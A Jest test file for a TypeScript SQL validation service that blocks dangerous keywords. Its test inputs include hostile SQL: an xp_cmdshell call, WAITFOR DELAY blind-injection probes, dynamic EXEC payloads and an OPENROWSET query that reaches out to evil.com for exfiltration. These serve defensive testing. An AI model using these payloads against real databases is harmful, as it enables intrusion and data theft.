import { SqlValidationService } from './sql-validation.service';

describe('SqlValidationService', () => {
  let service: SqlValidationService;

  beforeEach(() => {
    service = new SqlValidationService();
  });

  describe('validateSql - basic cases', () => {
    it('should allow a simple SELECT statement', () => {
      const result = service.validateSql('SELECT * FROM TGFPAR');
      expect(result.valid).toBe(true);
    });

    it('should reject an empty SQL string', () => {
      const result = service.validateSql('');
      expect(result.valid).toBe(false);
    });

    it('should reject DDL DROP command', () => {
      const result = service.validateSql('DROP TABLE TGFPAR');
      expect(result.valid).toBe(false);
      expect(result.blockedKeywords).toContain('DROP');
    });

    it('should reject DDL CREATE command', () => {
      const result = service.validateSql('CREATE TABLE foo (id INT)');
      expect(result.valid).toBe(false);
      expect(result.blockedKeywords).toContain('CREATE');
    });
  });

  describe('validateSql - existing dangerous keywords', () => {
    it('should block EXEC keyword', () => {
      const result = service.validateSql('SELECT 1; EXEC sp_who');
      expect(result.valid).toBe(false);
      expect(result.blockedKeywords).toContain('EXEC');
    });

    it('should block xp_ stored procedure prefix', () => {
      const result = service.validateSql('SELECT 1; xp_cmdshell(\'dir\')');
      expect(result.valid).toBe(false);
      expect(result.blockedKeywords).toContain('xp_');
    });
  });

  describe('validateSql - new blocked patterns (WAITFOR, OPENROWSET, dynamic EXEC)', () => {
    it('should block WAITFOR DELAY (time-based blind injection)', () => {
      const result = service.validateSql("SELECT 1; WAITFOR DELAY '0:0:5'");
      expect(result.valid).toBe(false);
      expect(result.reason).toMatch(/prohibited/i);
      expect(result.blockedKeywords).toContain('WAITFOR');
    });

    it('should block OPENROWSET (out-of-band data exfiltration)', () => {
      const result = service.validateSql(
        "SELECT * FROM OPENROWSET('SQLNCLI', 'Server=evil.com;', 'SELECT 1')",
      );
      expect(result.valid).toBe(false);
      expect(result.blockedKeywords).toContain('OPENROWSET');
    });

    it('should block EXEC( dynamic SQL pattern', () => {
      const result = service.validateSql("SELECT 1; EXEC('DROP TABLE foo')");
      expect(result.valid).toBe(false);
      expect(result.blockedKeywords).toContain('DYNAMIC_SQL');
    });

    it('should block EXECUTE( dynamic SQL pattern', () => {
      const result = service.validateSql("SELECT 1; EXECUTE('SELECT * FROM secret')");
      expect(result.valid).toBe(false);
      expect(result.blockedKeywords).toContain('DYNAMIC_SQL');
    });

    it('should block EXEC ( with whitespace before paren', () => {
      const result = service.validateSql("SELECT 1; EXEC  ('payload')");
      expect(result.valid).toBe(false);
      expect(result.blockedKeywords).toContain('DYNAMIC_SQL');
    });
  });

  describe('isSqlSafe - convenience method', () => {
    it('should return true for safe SELECT', () => {
      expect(service.isSqlSafe('SELECT CODPARC FROM TGFPAR')).toBe(true);
    });

    it('should return false for WAITFOR', () => {
      expect(service.isSqlSafe("WAITFOR DELAY '0:0:1'")).toBe(false);
    });
  });
});
